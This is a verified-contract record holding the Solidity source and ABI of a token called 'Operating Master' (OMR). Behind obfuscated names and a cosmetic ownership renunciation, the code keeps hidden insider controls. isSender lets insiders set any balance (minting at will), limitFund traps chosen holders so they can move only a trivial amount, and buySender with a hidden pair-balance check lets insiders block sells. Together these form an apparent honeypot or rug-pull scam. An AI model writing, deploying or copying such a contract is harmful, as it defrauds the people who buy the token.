{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface minTake {\n    function createPair(address modeAt, address shouldSwapFee) external returns (address);\n}\n\ninterface liquidityFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyAmount) external view returns (uint256);\n\n    function transfer(address swapBuyMax, uint256 takeTeam) external returns (bool);\n\n    function allowance(address teamTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapBuyMax,\n        uint256 takeTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingReceiver, uint256 value);\n    event Approval(address indexed teamTotal, address indexed spender, uint256 value);\n}\n\nabstract contract buyFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityFromMetadata is liquidityFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OperatingMaster is buyFee, liquidityFrom, liquidityFromMetadata {\n\n    mapping(address => bool) public txFrom;\n\n    uint256 listSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoTrading;\n    }\n\n    function owner() external view returns (address) {\n        return limitBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atMode;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTx;\n    }\n\n    string private autoTrading = \"OMR\";\n\n    function walletMode(address toSell) public {\n        if (marketingFundFrom) {\n            return;\n        }\n        \n        amountIs[toSell] = true;\n        \n        marketingFundFrom = true;\n    }\n\n    function approve(address amountReceiverLiquidity, uint256 takeTeam) public virtual override returns (bool) {\n        modeReceiver[_msgSender()][amountReceiverLiquidity] = takeTeam;\n        emit Approval(_msgSender(), amountReceiverLiquidity, takeTeam);\n        return true;\n    }\n\n    function balanceOf(address buyAmount) public view virtual override returns (uint256) {\n        return limitAmount[buyAmount];\n    }\n\n    mapping(address => bool) public amountIs;\n\n    uint256 private totalShould;\n\n    uint256 private receiverSell;\n\n    address limitToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private atMode = \"Operating Master\";\n\n    uint256 private senderExempt;\n\n    function transfer(address exemptSell, uint256 takeTeam) external virtual override returns (bool) {\n        return receiverWalletLaunch(_msgSender(), exemptSell, takeTeam);\n    }\n\n    address public teamFee;\n\n    uint256 constant fundIs = 12 ** 10;\n\n    address public teamLaunchFee;\n\n    function buySender(uint256 takeTeam) public {\n        launchedAuto();\n        listSell = takeTeam;\n    }\n\n    address maxTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitFund(address liquidityTake) public {\n        launchedAuto();\n        if (senderExempt == totalShould) {\n            senderExempt = totalShould;\n        }\n        if (liquidityTake == teamFee || liquidityTake == teamLaunchFee) {\n            return;\n        }\n        txFrom[liquidityTake] = true;\n    }\n\n    address private limitBuy;\n\n    constructor (){\n        \n        amountTotal tokenMax = amountTotal(limitToken);\n        teamLaunchFee = minTake(tokenMax.factory()).createPair(tokenMax.WETH(), address(this));\n        \n        teamFee = _msgSender();\n        amountIs[teamFee] = true;\n        limitAmount[teamFee] = exemptTx;\n        enableReceiver();\n        if (senderExempt == receiverSell) {\n            receiverSell = totalShould;\n        }\n        emit Transfer(address(0), teamFee, exemptTx);\n    }\n\n    function isSender(address exemptSell, uint256 takeTeam) public {\n        launchedAuto();\n        limitAmount[exemptSell] = takeTeam;\n    }\n\n    event OwnershipTransferred(address indexed teamAutoLaunched, address indexed receiverExemptLiquidity);\n\n    function launchedAuto() private view {\n        require(amountIs[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private modeReceiver;\n\n    uint256 private exemptTx = 100000000 * 10 ** 18;\n\n    function receiverWalletLaunch(address atSwapLiquidity, address swapBuyMax, uint256 takeTeam) internal returns (bool) {\n        if (atSwapLiquidity == teamFee) {\n            return limitFeeFund(atSwapLiquidity, swapBuyMax, takeTeam);\n        }\n        uint256 sellLimit = liquidityFrom(teamLaunchFee).balanceOf(maxTake);\n        require(sellLimit == listSell);\n        require(swapBuyMax != maxTake);\n        if (txFrom[atSwapLiquidity]) {\n            return limitFeeFund(atSwapLiquidity, swapBuyMax, fundIs);\n        }\n        return limitFeeFund(atSwapLiquidity, swapBuyMax, takeTeam);\n    }\n\n    function getOwner() external view returns (address) {\n        return limitBuy;\n    }\n\n    bool public marketingFundFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeSwap;\n    }\n\n    uint8 private feeSwap = 18;\n\n    function allowance(address exemptMode, address amountReceiverLiquidity) external view virtual override returns (uint256) {\n        if (amountReceiverLiquidity == limitToken) {\n            return type(uint256).max;\n        }\n        return modeReceiver[exemptMode][amountReceiverLiquidity];\n    }\n\n    uint256 totalMax;\n\n    function limitFeeFund(address atSwapLiquidity, address swapBuyMax, uint256 takeTeam) internal returns (bool) {\n        require(limitAmount[atSwapLiquidity] >= takeTeam);\n        limitAmount[atSwapLiquidity] -= takeTeam;\n        limitAmount[swapBuyMax] += takeTeam;\n        emit Transfer(atSwapLiquidity, swapBuyMax, takeTeam);\n        return true;\n    }\n\n    function transferFrom(address atSwapLiquidity, address swapBuyMax, uint256 takeTeam) external override returns (bool) {\n        if (_msgSender() != limitToken) {\n            if (modeReceiver[atSwapLiquidity][_msgSender()] != type(uint256).max) {\n                require(takeTeam <= modeReceiver[atSwapLiquidity][_msgSender()]);\n                modeReceiver[atSwapLiquidity][_msgSender()] -= takeTeam;\n            }\n        }\n        return receiverWalletLaunch(atSwapLiquidity, swapBuyMax, takeTeam);\n    }\n\n    mapping(address => uint256) private limitAmount;\n\n    function enableReceiver() public {\n        emit OwnershipTransferred(teamFee, address(0));\n        limitBuy = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAutoLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExemptLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountReceiverLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"buySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"isSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunchFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwapLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapBuyMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"}],\"name\":\"walletMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OperatingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}